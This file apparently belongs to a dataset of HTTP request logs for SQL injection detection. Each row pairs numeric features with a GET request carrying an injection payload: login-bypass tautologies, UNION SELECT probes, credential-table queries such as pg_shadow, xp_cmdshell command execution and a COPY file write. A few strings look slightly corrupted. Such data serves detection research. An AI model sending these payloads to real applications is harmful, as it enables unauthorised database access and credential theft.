58,1,200,5603,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,7408,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
25,1,200,2024,7,4,6,1,2,GET ?id=or 1=1-- HTTP/1.1
74,1,200,7816,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,7617,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,6068,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,1157,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,7405,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,4042,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,7132,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,2029,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,6725,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,2370,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
74,1,200,1439,7,47,7,1,1,GET ?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
65,1,200,3858,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,3049,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,1031,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,7015,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,4546,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,6244,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,6168,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,3161,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
65,1,200,6953,7,42,5,2,1,GET login/?id=select session_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,4953,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,5739,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,3253,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,2123,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,4779,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,3641,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,7046,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,5132,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
52,1,200,5064,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,7455,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,5457,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,3846,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,2843,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,4291,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,2831,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
49,1,200,1441,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,3779,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,1113,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,4712,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,5659,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,4933,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
56,1,200,7623,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
56,1,200,3888,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
41,1,200,7317,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,4543,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,1054,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,1863,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7671,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7154,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,3256,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,6604,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7159,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
38,1,200,5946,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
32,1,200,6628,7,9,8,2,1,GET login/?id=' or ''=' HTTP/1.1
32,1,200,2738,7,9,8,2,1,GET login/?id=' or ''=' HTTP/1.1
32,1,200,7032,7,9,8,2,1,GET login/?id=' or ''=' HTTP/1.1
32,1,200,4517,7,9,8,2,1,GET login/?id=' or ''=' HTTP/1.1
58,1,200,2657,21,16,10,1,1,GET ?id=' UNION ALL SELECT system_user()_user();# HTTP/1.1
42,1,200,4114,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,7118,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
27,1,200,2380,7,5,6,1,1,GET ?id=' and 1='1 HTTP/1.1
41,1,200,3171,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,1562,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,1858,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,3395,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,6173,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,2545,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
20,1,200,6287,7,2,4,1,1,GET ?id=' – HTTP/1.1
20,1,200,5244,7,2,4,1,1,GET ?id=' – HTTP/1.1
20,1,200,3189,7,2,4,1,1,GET ?id=' – HTTP/1.1
23,1,200,5184,7,4,4,1,0,GET ?id=or 1=1 HTTP/1.1
23,1,200,6757,7,4,4,1,0,GET ?id=or 1=1 HTTP/1.1
23,1,200,2677,7,4,4,1,0,GET ?id=or 1=1 HTTP/1.1
23,1,200,7910,7,4,4,1,0,GET ?id=or 1=1 HTTP/1.1
23,1,200,7713,7,4,4,1,0,GET ?id=or 1=1 HTTP/1.1
35,1,200,3624,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,3722,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,3159,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,2431,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
35,1,200,2930,7,4,6,1,1,GET ?id=' or         0=0 # HTTP/1.1
25,1,200,6059,7,7,5,2,1,GET login/?id='# HTTP/1.1
31,1,200,4031,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
31,1,200,7986,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
31,1,200,7618,7,9,5,2,0,GET login/?id= or 1=1# HTTP/1.1
49,1,200,1469,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,1241,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,2075,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
49,1,200,4936,7,28,6,2,1,GET login/?id=select current_database(); HTTP/1.1
20,1,200,3637,7,2,5,1,1,GET ?id=' ' HTTP/1.1
20,1,200,6086,7,2,5,1,1,GET ?id=' ' HTTP/1.1
37,1,200,5761,7,11,9,1,1,GET ?id=admin'or 1=1 or ''=' HTTP/1.1
37,1,200,6227,7,11,9,1,1,GET ?id=admin'or 1=1 or ''=' HTTP/1.1
37,1,200,3871,7,11,9,1,1,GET ?id=admin'or 1=1 or ''=' HTTP/1.1
50,1,200,5158,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
50,1,200,1134,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
50,1,200,1361,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
31,1,200,2234,7,4,11,1,1,GET ?id=' or '1'='1'-- HTTP/1.1
31,1,200,1343,7,4,11,1,1,GET ?id=' or '1'='1'-- HTTP/1.1
31,1,200,4176,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,6870,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
39,1,200,2421,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,2022,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,3273,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,5219,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,4708,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,4342,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,2486,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,2130,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,6620,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,1233,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,3404,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,5307,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
30,1,200,4556,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
30,1,200,7469,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
30,1,200,7049,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
27,1,200,1700,7,6,7,1,1,GET ?id=' or a=a-- HTTP/1.1
27,1,200,7652,7,6,7,1,1,GET ?id=' or a=a-- HTTP/1.1
27,1,200,6889,7,6,7,1,1,GET ?id=' or a=a-- HTTP/1.1
36,1,200,6413,7,9,8,2,1,GET login/?id=) or ('1′='1– HTTP/1.1
50,1,200,4656,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,4005,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,6728,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,1663,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,1589,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,4771,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
57,1,200,5053,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,4139,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,1199,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7996,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7737,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,1019,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,4198,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,7664,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
32,1,200,3886,7,4,11,2,1,GET ?id=') or '1'='1'/* HTTP/1.1
32,1,200,4832,7,4,11,2,1,GET ?id=') or '1'='1'/* HTTP/1.1
37,1,200,7024,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
37,1,200,6184,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
37,1,200,6220,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
37,1,200,1959,9,9,11,2,1,GET login/?id=' OR 'x'='x'#; HTTP/1.1
58,1,200,4830,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,5350,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,2750,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,2493,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,2404,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,5451,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,6338,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,3148,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,6634,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,4495,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,7362,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
33,1,200,4798,7,9,5,2,1,GET login/?id=' or 0=0 – HTTP/1.1
33,1,200,5775,7,9,5,2,1,GET login/?id=' or 0=0 – HTTP/1.1
33,1,200,4794,7,9,7,2,1,GET login/?id=' or 1=1;# HTTP/1.1
33,1,200,4970,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
33,1,200,1187,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
38,1,200,4712,7,9,11,3,1,GET login/?id=') or '1'='1'/* HTTP/1.1
38,1,200,7261,7,9,11,3,1,GET login/?id=') or '1'='1'/* HTTP/1.1
38,1,200,1385,7,9,11,3,1,GET login/?id=') or '1'='1'/* HTTP/1.1
38,1,200,3784,7,9,11,3,1,GET login/?id=') or '1'='1'/* HTTP/1.1
63,1,200,2145,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,7874,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,2140,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,1398,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,1193,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,2754,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
75,1,200,2094,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,1214,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,5865,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,5475,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,1924,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,2585,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,7905,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
32,1,200,4906,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
32,1,200,6020,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
32,1,200,5122,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
32,1,200,5521,7,9,6,2,2,GET login/?id= or 1=1-- HTTP/1.1
32,1,200,4709,7,4,12,1,1,GET ?id=') or ('1'='1-- HTTP/1.1
69,1,200,1239,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3701,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,1062,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,5342,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3265,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,1741,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3041,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,5839,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3796,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
39,1,200,1494,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,2475,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,4010,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,2544,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,5745,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,6126,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
39,1,200,4654,7,20,5,2,0,GET login/?id=select @@version HTTP/1.1
43,1,200,3817,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,1845,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,3070,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,4003,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,3207,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,6595,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,6816,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
37,1,200,7761,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,3095,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,4978,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,5775,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,7563,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,5798,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
38,1,200,3800,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,5736,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,7654,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
26,1,200,6170,7,7,6,2,1,GET login/?id='-- HTTP/1.1
26,1,200,4993,7,7,6,2,1,GET login/?id='-- HTTP/1.1
26,1,200,7430,7,7,6,2,1,GET login/?id='-- HTTP/1.1
26,1,200,5824,7,7,6,2,1,GET login/?id='-- HTTP/1.1
43,1,200,2140,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,1718,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,6684,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
46,1,200,2107,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,5898,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,7809,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,3937,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,6504,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,4924,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
46,1,200,3038,7,24,5,2,1,GET login/?id=select * from pg_group; HTTP/1.1
30,1,200,1733,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,7760,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,2149,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
69,1,200,2072,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,3863,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5945,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,7945,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5819,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5428,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,6135,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,4230,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,4715,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5035,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
25,1,200,4390,7,8,3,1,1,GET ?id= or true HTTP/1.1
25,1,200,6967,7,8,3,1,1,GET ?id= or true HTTP/1.1
25,1,200,2872,7,8,3,1,1,GET ?id= or true HTTP/1.1
25,1,200,3286,7,8,3,1,1,GET ?id= or true HTTP/1.1
25,1,200,7628,7,8,3,1,1,GET ?id= or true HTTP/1.1
59,1,200,3891,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,2850,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,6680,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,6456,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,2142,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,4209,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,6163,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,5921,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
35,1,200,3416,7,9,10,1,1,GET ?id=admin' or '1'='1'# HTTP/1.1
35,1,200,2538,7,9,10,1,1,GET ?id=admin' or '1'='1'# HTTP/1.1
34,1,200,4843,7,12,6,1,1,GET ?id=' or user like '% HTTP/1.1
31,1,200,5401,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
31,1,200,4849,7,12,5,3,1,GET login/?id=admin'/* HTTP/1.1
41,1,200,5581,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
27,1,200,3950,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
27,1,200,7961,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
27,1,200,5609,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
26,2,200,2095,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,4226,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,1963,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,5054,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,4897,7,7,6,2,1,GET login/?id='&' HTTP/1.1
39,1,200,7467,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
39,1,200,2512,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
39,1,200,2198,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
62,1,200,3128,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,2923,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,3096,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,1032,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,6409,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,1458,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,2789,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,6455,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,6774,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
42,1,200,7763,7,19,6,2,1,GET login/?id=' or userid like '% HTTP/1.1
33,1,200,2369,7,11,6,1,1,GET ?id=' or uid like '% HTTP/1.1
33,1,200,1324,7,11,6,1,1,GET ?id=' or uid like '% HTTP/1.1
33,1,200,7885,7,11,6,1,1,GET ?id=' or uid like '% HTTP/1.1
26,1,200,1388,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,7945,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
26,1,200,1650,7,6,5,1,1,GET ?id=' or a=a– HTTP/1.1
57,1,200,7546,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,2941,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,1427,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,2799,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,5935,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,6835,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,4963,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,6358,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,5789,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,5471,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
29,1,200,6507,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
29,1,200,4906,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
29,1,200,6724,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
51,1,200,3436,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,4953,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,6782,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,4542,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
51,1,200,2730,7,30,5,1,1,GET ?id=select user from sysibm.sysdummy1; HTTP/1.1
26,1,200,3387,7,7,4,2,1,GET login/?id=' – HTTP/1.1
26,1,200,4392,7,7,4,2,1,GET login/?id=' – HTTP/1.1
26,1,200,4992,7,7,4,2,1,GET login/?id=' – HTTP/1.1
26,1,200,7318,7,7,4,2,1,GET login/?id=' – HTTP/1.1
34,1,200,2016,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
34,1,200,6886,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
34,1,200,2079,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
